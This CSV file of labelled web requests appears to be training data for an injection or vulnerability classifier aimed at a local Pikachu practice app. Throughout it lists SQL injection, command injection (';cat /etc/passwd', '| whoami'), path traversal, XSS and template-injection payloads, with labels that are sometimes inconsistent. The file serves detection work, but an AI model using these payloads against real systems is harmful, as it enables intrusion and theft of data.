label,url,param,payload,risk_level,v1,v2,v3,v4,v5,v6,v7,v8,v9,v10,v11,v12,v13
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,& whoami,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,1%00,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,submit,php://filter/convert.base64-encode/resource=index.php,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,submit,user004,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,1%00   ,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,submit,random_user_name,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,..\..\..\..\..\..\..\..\windows\win.ini,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,submit,user005,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,1%00 #,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,submit,{{7*7}},normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,submit,ready,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,',high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,1' AND 1=1 #,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,/etc/passwd,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,submit,{{config}},normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,1' AND 1=2 #,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,submit,sample_input,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,submit,| type C:\Windows\win.ini,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,' -- ,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,2023-10-27,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,submit,| whoami,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,submit,test12345,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,; cat /etc/passwd,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,0,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,submit,|| whoami,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,submit,test_safe_string,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,; whoami,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,0  ,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,submit,test_safe_string #,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,<%= 7*7 %>,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,0 -- ,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,<body onload=alert(1)>,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,submit,test_safe_string -- ,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,0%00,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,submit,test_safe_string%00,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,' AND sleep(5) --,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,1,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,"""",high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,submit,user001,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,""" OR 1=1 --",high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,' OR 1=1 --,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,1%00,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,submit,user002,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,${7*7},high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,1%00   ,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,submit,user003,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,<iframe src=javascript:alert(1)></iframe>,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,"' UNION SELECT 1,2,3,4,5 --",high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,1%00 #,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,submit,user004,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,& ping -c 1 127.0.0.1,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,1' AND 1=1 #,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,submit,user005,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,<img src=x onerror=alert(1)>,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,1' AND 1=2 #,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,submit,{{7*7}},normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,2023-10-27,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,submit,{{config}},normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,& whoami,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,; cat /etc/passwd,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,submit,| type C:\Windows\win.ini,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,"'""><script>alert(1)</script>",high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,',high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,; whoami,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,submit,| whoami,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,<script>alert(1)</script>,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,submit,|| whoami,normal,-0.001256055984209582,0.0,0.0,0.0,0.9993715773408745,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,<svg/onload=alert(1)>,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,<%= 7*7 %>,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,'%00,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,' -- ,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,<body onload=alert(1)>,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,C:\Windows\win.ini,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,`whoami`,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,'%00 -- ,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,"""",high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,abc,normal,0.0,0.0,0.0,0.0,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,') OR ('1'='1,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,abc ,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,' AND sleep(5) --,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,""" OR 1=1 --",high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,abc  ,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,<iframe src=javascript:alert(1)></iframe>,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,../../../../../../../../etc/passwd,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,abc    ,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,' OR 1=1 --,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,active,normal,0.0,0.0,0.0,0.0,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,${7*7},high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,<img src=x onerror=alert(1)>,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,..\..\..\..\..\..\..\..\windows\win.ini,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,done,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,"' UNION SELECT 1,2,3,4,5 --",high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,hello_world,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,/etc/passwd,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,& ping -c 1 127.0.0.1,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,inactive,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,0,high,0.0,0.0,0.0,0.0,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,& whoami,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,0  ,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,',high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,0 -- ,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,0%00,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,' -- ,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,1,high,0.0,0.0,0.0,0.0,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,<script>alert(1)</script>,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,"'""><script>alert(1)</script>",high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,1%00,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,javascript:alert(1),normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,<svg/onload=alert(1)>,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,1%00   ,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,C:\Windows\win.ini,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,1%00 #,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,normaltext,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,'%00,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,' AND sleep(5) --,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,`whoami`,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,1' AND 1=1 #,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,abc,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,ok,normal,0.0,0.0,0.0,0.0,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,abc ,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,php://filter/convert.base64-encode/resource=index.php,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=306,id,'%00 -- ,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=279,id,' OR 1=1 --,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=242,id,1' AND 1=2 #,high,-0.08864166517136192,1.0,0.0,0.0,0.9536237326323695,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/xss/xss_stored.php?id=113,message,abc  ,normal,-0.0024492965739717435,0.0,0.0,0.0,0.9987738501106526,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/pikachu/vul/sqli/sqli_del.php,submit,random_user_name,normal,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
